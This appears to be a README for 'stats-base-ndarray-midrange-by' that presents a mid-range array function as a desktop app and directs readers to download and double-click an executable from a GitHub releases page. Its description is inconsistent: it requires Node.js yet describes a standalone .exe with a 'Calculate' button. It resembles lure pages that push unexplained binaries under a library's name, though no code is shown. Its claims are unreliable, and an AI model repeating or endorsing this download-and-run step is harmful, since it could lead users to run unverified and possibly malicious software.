# 🎉 stats-base-ndarray-midrange-by - Compute the Mid-Range Easily

## 🚀 Getting Started

Welcome! This guide helps you download and run **stats-base-ndarray-midrange-by**, an application designed to compute the mid-range of a one-dimensional ndarray. This means you can find the average of your data's high and low points easily.

## 📥 Download Now

[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)

## 📂 What You Need

Before you begin, ensure your computer meets the following requirements:

- **Operating System:** Windows, macOS, or Linux
- **Node.js:** Version 12 or higher
- **Internet Connection:** Required for downloading the application

## 🛠 Installation Steps

1. **Visit the Releases Page**
   
   Click the link below to open the releases page:
   [Download Here](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)

2. **Choose the Latest Version**

   On the releases page, you will see a list of available versions. Look for the most recent version, marked as "latest."

3. **Download the Application**

   Click on the release title. You will find assets related to that release. Look for the file specific to your operating system. For example, if you're using Windows, you might see something like `stats-base-ndarray-midrange-by-win.exe`.

4. **Run the Application**

   After the download is complete, locate the downloaded file on your computer. Double-click it to run the application. Follow any on-screen instructions that may appear.

5. **Input Your Data**

   Once the application is running, enter your one-dimensional ndarray data. You can input your data as a list. For example, enter: `[1, 2, 3, 4, 5]`.

6. **Compute the Mid-Range**

   Click the "Calculate" button to find the mid-range of your input data. The application will display the result immediately.

## 💡 How It Works

The mid-range is calculated by taking the highest and lowest values in your dataset and averaging them. This application uses a callback function to process the input, making it efficient and easy to use.

### Example Calculation

For the input data `[1, 2, 3, 4, 5]`:

1. Identify the highest value: **5**
2. Identify the lowest value: **1**
3. Calculate the mid-range:

   \[
   \text{Mid-Range} = \frac{(5 + 1)}{2} = 3
   \]

The application will show **3** as the result.

## 📊 Features

- **User-Friendly Interface:** Simple and intuitive design.
- **Cross-Platform:** Works on Windows, macOS, and Linux.
- **Fast Calculations:** Provides results quickly, even for large datasets.
- **Customizable:** Enter any one-dimensional array for calculation.

## ❓ Frequently Asked Questions

### 1. What is an ndarray?

An ndarray (N-dimensional array) is a data structure commonly used to store numerical data. In our app, you use a one-dimensional array to compute the mid-range.

### 2. Can I use this app on my mobile device?

Currently, this application is designed for desktop systems only. We recommend using a computer for the best experience.

### 3. What should I do if I face any issues?

If you encounter any problems, try the following:

- Ensure Node.js is installed correctly.
- Check if you downloaded the right file for your operating system.
- Restart the application and try again.
